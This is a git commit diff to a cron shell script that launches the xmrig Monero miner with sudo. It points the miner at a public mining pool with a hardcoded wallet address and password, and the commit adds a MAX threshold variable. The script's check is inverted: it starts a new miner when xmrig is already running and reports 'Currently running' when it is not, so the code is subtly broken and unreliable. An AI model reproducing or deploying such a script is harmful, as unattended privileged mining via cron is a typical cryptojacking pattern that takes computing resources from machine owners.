5213b0238f43e31427c5a74b3b8d9d8c536da732
marzban2030 <73051714+marzban2030@users.noreply.github.com>
2023-07-20 14:28:41 +0330

    Update cron.sh

--- cron.sh
+++ cron.sh
@@ -1,7 +1,8 @@
 
+MAX=1
 RUNNINGS=$(top -n 1 | grep "xmrig" | wc -l)
 
-if [ "$RUNNINGS" -ge 1 ]; then
+if [ "$RUNNINGS" -ge "$MAX" ]; then
   sudo ./xmrig -o pool.hashvault.pro:80 -u 489bQgtKUGsWvdvjvqw5jVLCo6aEhteJ3aRnTueyHaJUBBpp5qjKd3bXtCkCUF8ZxCFiDWnk8dJJJMqtHPDfkkEW9jJ6gUK -p Reza99
 else
   echo "Currently running ..."
